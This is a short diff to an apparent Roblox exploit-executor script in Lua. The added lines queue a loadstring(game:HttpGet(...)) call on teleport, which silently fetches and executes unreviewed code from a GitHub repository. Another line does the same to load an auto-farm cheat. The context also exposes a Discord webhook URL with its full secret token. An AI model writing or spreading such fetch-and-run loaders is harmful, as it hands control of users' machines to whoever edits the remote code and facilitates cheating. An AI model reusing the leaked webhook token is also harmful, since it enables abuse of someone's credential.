@@ -1,4 +1,6 @@
 queue_on_teleport([[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TimeDeos/RandomShit/main/RandomShit"))()
+]])
 print("hi")
 local minWinstreak = 10
 local webhookUrl = "https://discord.com/api/webhooks/1266700040366325781/t6RiLwhoYCqBnz69F27AR1cIv70SRibfyyO9rejtnt0UDZL16pt0GKOMEhy4-jd4l6-S"
@@ -139,4 +141,4 @@ else
 
     -- Load external script
     loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/RivalsAutoFarmNice/main/Code"))()
-end]])
+end
